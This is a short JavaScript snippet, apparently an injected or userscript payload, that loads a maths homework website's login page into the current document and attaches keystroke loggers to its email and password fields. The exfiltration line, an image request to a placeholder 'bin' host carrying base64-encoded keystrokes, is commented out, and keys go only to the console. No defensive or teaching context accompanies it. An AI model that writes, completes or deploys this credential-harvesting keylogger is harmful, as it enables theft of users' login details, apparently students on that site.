//(function() {
  window.comfort = 'https://www.drfrostmaths.com/do-question.php?aaid=10972720'
  window.bin = 'https://???/bin?data='

  window.load = async path => document.write(
    await fetch(path)
    .then(r => r.text())
  )

  window.log = data => {
    //new Image()
    //.src = `${bin}${btoa(JSON.stringify(data))}`
    console.log(`in data: ${data}`)
  }
  
  load(`/login.php?url=${encodeURIComponent(comfort)}`)
  setTimeout(() => {
  document.querySelector('[name=login-email]').onkeydown = ({key}) => log(key)
  document.querySelector('[name=login-password]').onkeydown = ({key}) => log(key)
  }, 4000)
//})()
